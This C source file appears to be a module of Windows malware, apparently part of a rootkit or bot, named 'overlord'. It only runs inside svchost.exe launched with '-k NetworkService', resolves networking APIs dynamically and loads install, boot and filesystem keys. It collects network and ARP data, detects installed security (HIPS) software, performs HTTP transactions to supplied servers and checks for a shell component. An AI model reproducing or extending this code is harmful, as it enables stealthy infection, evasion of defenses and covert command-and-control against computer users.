#include "overlord.h"
#include "netinfo.h"
#include "hipsinfo.h"
#include "netcomm.h"
#include "shell.h"

HANDLE gHeap = NULL;
dll_block_t gDllBlock;
OSVERSIONINFO gOsVerInfo;
int gThreadAlive = 1;
HANDLE gHThread = NULL;

int HelperRequest(poverlord_request_info_t pOri);

HANDLE hSockLib;
FnWSAStartup fnWSAStartup;
FnWSACleanup fnWSACleanup;
FnWSAGetLastError fnWSAGetLastError;
// FnWSASocketA fnWSASocketA;
Fnsocket fnsocket;
// Fnbind fnbind;
Fngethostbyname fngethostbyname;
Fngetaddrinfo fngetaddrinfo;
Fnfreeaddrinfo fnfreeaddrinfo;
Fnsetsockopt fnsetsockopt;
Fngetsockopt fngetsockopt;
// Fngetsockname fngetsockname;
// Fnntohs fnntohs;
Fnhtons fnhtons;
Fnselect fnselect;
// Fnhtonl fnhtonl;
Fnntohl fnntohl;
Fnconnect fnconnect;
Fnioctlsocket fnioctlsocket;
// Fngetpeername fngetpeername;
Fnclosesocket fnclosesocket;
Fnshutdown fnshutdown;
// Fngethostname fngethostname;
Fnsend fnsend;
Fnrecv fnrecv;
// Fnsendto fnsendto;
// Fnrecvfrom fnrecvfrom;
// Fnaccept fnaccept;
// Fnlisten fnlisten;
Fn__WSAFDIsSet fn__WSAFDIsSet;
Fninet_addr fninet_addr;

#ifdef _CONSOLE

DWORD WINAPI overlord_common(void* pParam)
{
    uint32_t counter = 0;

#ifdef _CONSOLE

    shell_check_presence();
    netinfo_update();
    {
        int i;
        overlord_request_info_t ori;
        __stosb((uint8_t*)&ori, 0, sizeof(overlord_request_info_t));

        for (i = 0; i < 100; ++i) {
            ori.orid = ORID_NETCOMM_CHECK;
            HelperRequest(&ori);
           // Sleep(100);
        }

        ori.orid = ORID_NETCOMM_GET_NTP;
        HelperRequest(&ori);
    }
    //netcomm_check();
#endif // _CONSOLE

    while (gThreadAlive) {
        DBG_PRINTF(("I'm alive: %u\n", ++counter));
        Sleep(1000 * 3);
    }
    return 0;
}

#endif // _CONSOLE

#ifdef _CONSOLE

int __cdecl main(int argc, char** argv)

#else

int LoadRequest(pdll_block_t pDllBlock)

#endif
{
#ifndef _CONSOLE
    char procName[MAX_PATH];
    char *cmdLine;
//    int ret;
#else
    uint32_t threadId;
#endif 
    ULONG heapInfValue = 2;

    gOsVerInfo.dwOSVersionInfoSize = sizeof(gOsVerInfo);
    GetVersionEx(&gOsVerInfo);

#ifndef _CONSOLE
    __movsb((uint8_t*)&gDllBlock, (uint8_t*)pDllBlock, sizeof(dll_block_t));

    DBG_PRINTF(("Startup information:\n"));
    DBG_PRINTF(("- NTDLL.DLL base = 0x%08X\n", gDllBlock.ntdllBase));
    DBG_PRINTF(("- KERNEL.DLL base = 0x%08X\n", gDllBlock.kernel32Base));
    DBG_PRINTF(("- Self base = 0x%08X\n", gDllBlock.selfBase));
    DBG_PRINTF_ARR("- Install key", gDllBlock.installKey, sizeof(gDllBlock.installKey));
    DBG_PRINTF_ARR("- Boot key", gDllBlock.bootKey, sizeof(gDllBlock.bootKey));
    DBG_PRINTF_ARR("- FS key", gDllBlock.fsKey, sizeof(gDllBlock.fsKey));
    DBG_PRINTF_ARR("- Client ID", gDllBlock.clientId, sizeof(gDllBlock.clientId));
#endif // _CONSOLE

    // Создаём кучу.
    gHeap = HeapCreate(0, 1024 * 1024, 0);

    if (gHeap == NULL) {
        DBG_PRINTF(("Failed to create Heap\n"));
        return 0;
    }
    // Устанавливаем низкую фрагментацию кучи.
    HeapSetInformation(gHeap, HeapCompatibilityInformation, &heapInfValue, sizeof(heapInfValue));
#ifndef _CONSOLE
    GetModuleFileName(NULL, procName, sizeof(procName));
    utils_to_lower(procName);
    DBG_PRINTF(("%s\n", procName));

    for (cmdLine = procName; lstrlenA(cmdLine) >= 21; ++cmdLine) {
        if (utils_strnicmp(cmdLine, "\\system32\\svchost.exe", 21) == 0) {
            break;
        }
    }

    if (lstrlenA(cmdLine) < 21) {
        DBG_PRINTF(("Non-target process - Terminated!\n"));
        return 0;
    }

    cmdLine = GetCommandLineA();
    DBG_PRINTF(("%s\n", cmdLine));
    cmdLine += lstrlenA(cmdLine) - 17;
    if (utils_strhash(cmdLine) != 0x61c022d4) { // hash of -k NetworkService
//     cmdLine += lstrlenA(cmdLine) - 10;
//     if (utils_strhash(cmdLine) != 0xB4A30DCD) { // hash of -k netsvcs
        DBG_PRINTF(("Non-target process - Terminated!\n"));
        return 0;
    }
// 
//     // Инициализируем API для взаимодействия с ZFS.
//     ret = zuserio_init(gDllBlock.fsKey, gDllBlock.clientId);
//     DBG_PRINTF(("zfs_init_proxy() returned %X\n", ret));
//     if (ret != ERR_OK) {
//         return 0;
//     }
#endif // _CONSOLE

    hSockLib = LoadLibrary("ws2_32.dll");
    fnWSAStartup = (FnWSAStartup)GetProcAddress(hSockLib, "WSAStartup");
    fnWSACleanup = (FnWSACleanup)GetProcAddress(hSockLib, "WSACleanup");
    fnWSAGetLastError = (FnWSAGetLastError)GetProcAddress(hSockLib, "WSAGetLastError");
//     fnWSASocketA = (FnWSASocketA)GetProcAddress(hSockLib, "WSASocketA");
    fnsocket = (Fnsocket)GetProcAddress(hSockLib, "socket");
//     fnbind = (Fnbind)GetProcAddress(hSockLib, "bind");
    fngethostbyname = (Fngethostbyname)GetProcAddress(hSockLib, "gethostbyname");
    fngetaddrinfo = (Fngetaddrinfo)GetProcAddress(hSockLib, "getaddrinfo");
    fnfreeaddrinfo = (Fnfreeaddrinfo)GetProcAddress(hSockLib, "freeaddrinfo");
    fnsetsockopt = (Fnsetsockopt)GetProcAddress(hSockLib, "setsockopt");
    fngetsockopt = (Fngetsockopt)GetProcAddress(hSockLib, "getsockopt");
//     fngetsockname = (Fngetsockname)GetProcAddress(hSockLib, "getsockname");
//     fnntohs = (Fnntohs)GetProcAddress(hSockLib, "ntohs");
    fnhtons = (Fnhtons)GetProcAddress(hSockLib, "htons");
    fnselect = (Fnselect)GetProcAddress(hSockLib, "select");
//     fnhtonl = (Fnhtonl)GetProcAddress(hSockLib, "htonl");
    fnntohl = (Fnntohl)GetProcAddress(hSockLib, "ntohl");
    fnconnect = (Fnconnect)GetProcAddress(hSockLib, "connect");
    fnioctlsocket = (Fnioctlsocket)GetProcAddress(hSockLib, "ioctlsocket");
//     fngetpeername = (Fngetpeername)GetProcAddress(hSockLib, "getpeername");
    fnclosesocket = (Fnclosesocket)GetProcAddress(hSockLib, "closesocket");
    fnshutdown = (Fnshutdown)GetProcAddress(hSockLib, "shutdown");
//     fngethostname = (Fngethostname)GetProcAddress(hSockLib, "gethostname");
    fnsend = (Fnsend)GetProcAddress(hSockLib, "send");
    fnrecv = (Fnrecv)GetProcAddress(hSockLib, "recv");
//     fnsendto = (Fnsendto)GetProcAddress(hSockLib, "sendto");
//     fnrecvfrom = (Fnrecvfrom)GetProcAddress(hSockLib, "recvfrom");
    fn__WSAFDIsSet = (Fn__WSAFDIsSet)GetProcAddress(hSockLib, "__WSAFDIsSet");
    fninet_addr = (Fninet_addr)GetProcAddress(hSockLib, "inet_addr");

    if (fnWSAStartup == NULL || fnWSACleanup == NULL || fnWSAGetLastError == NULL || fnsocket == NULL || fngethostbyname == NULL || fngetaddrinfo == NULL || fnfreeaddrinfo == NULL ||
        fnsetsockopt == NULL || fngetsockopt == NULL || fnhtons == NULL || fnselect == NULL || fnntohl == NULL || fnconnect == NULL || fnioctlsocket == NULL ||
        fnclosesocket == NULL || fnshutdown == NULL || fnsend == NULL || fnrecv == NULL || fn__WSAFDIsSet == NULL || fninet_addr == NULL) {
        return 0;
    }

#ifdef _CONSOLE
    gHThread = CreateThread(NULL, 0, overlord_common, NULL, 0, &threadId);
    WaitForSingleObject(gHThread, INFINITE);
#endif // _CONSOLE

    return 1;
}

#ifndef _CONSOLE
int UnloadRequest(pdll_block_t pDllBlock)
{
    DBG_PRINTF(("Unload request\n"));

    if (utils_memcmp(gDllBlock.clientId, pDllBlock->clientId, sizeof(pDllBlock->clientId)) != 0) {
        DBG_PRINTF(("Client ID is not equal with older one\n"));
    }

    if (gHThread != NULL) {
        gThreadAlive = 0;

        if (WaitForSingleObject(gHThread, 11 * 1000) == WAIT_TIMEOUT) {
            TerminateThread(gHThread, 1);
            DBG_PRINTF(("Thread terminated!\n"));
        }
        CloseHandle(gHThread);
    }

//     zuserio_shutdown();

    if (wsaInited) {
        fnWSACleanup();
    }

    FreeLibrary(hSockLib);

    return 1;
}
#endif // _CONSOLE

int HelperRequest(poverlord_request_info_t pOri)
{
    uint8_t* outData;
    uint32_t i;
    int ret = 0;

    outData = NULL;

    if (pOri->orid == ORID_NETWORK_INFO) {
        ret = netinfo_update();

        pOri->outSize = gAdaptersCount * sizeof(adapter_entry_t);

        for (i = 0; i < gAdaptersCount; ++i) {
            pOri->outSize += gpAdapters[i].arpEntriesCount * sizeof(arp_entry_t);
        }

        pOri->outSize += sizeof(uint32_t);

        outData = (uint8_t*)gpAdapters;
    }
    else if (pOri->orid == ORID_HIPS_INFO) {
        ret = hipsinfo_update();

        pOri->outSize = sizeof(uint64_t);
        outData = (uint8_t*)&gHipsMask;
    }
    else if (pOri->orid == ORID_NETCOMM_CHECK) {
        ret = netcomm_check();
    }
    else if (pOri->orid == ORID_NETCOMM_GET_NTP) {
        ret = netcomm_get_ntp_time(&i);
        outData = (uint8_t*)&i;
        pOri->outSize = sizeof(i);
    }
    else if (pOri->orid == ORIG_NETCOMM_GETHOSTBYNAME) {
        ret = netcomm_gethostbyname((const char*)pOri->inData, &i);
        outData = (uint8_t*)&i;
        pOri->outSize = sizeof(i);
    }
    else if (pOri->orid == ORID_NETCOMM_TRANSACT) {
        phttp_request_t pHttpReq = (phttp_request_t)pOri->inData;

        ret = netcomm_make_transaction(pHttpReq->server, pHttpReq->port, pHttpReq->http, pHttpReq->httpSize, &outData, &pOri->outSize);
    }
    else if (pOri->orid == ORIG_SHELL_GET_NAME) {
        ret = shell_check_presence();

        pOri->outSize = lstrlenA(shellExeName);
        outData = (uint8_t*)shellExeName;
    }

    if (ret && outData != NULL) {
        pOri->outData = VirtualAlloc(NULL, pOri->outSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (pOri->outData == NULL) {
            return 0;
        }

        if (pOri->orid == ORID_NETWORK_INFO) {
            __movsb(pOri->outData, outData, pOri->outSize - sizeof(uint32_t));
            *(uint32_t*)(pOri->outData + pOri->outSize - sizeof(uint32_t)) = gAdaptersCount;
        }
        else {
            __movsb(pOri->outData, outData, pOri->outSize);
        }
    }

    return ret;
}
//#endif // _CONSOLE
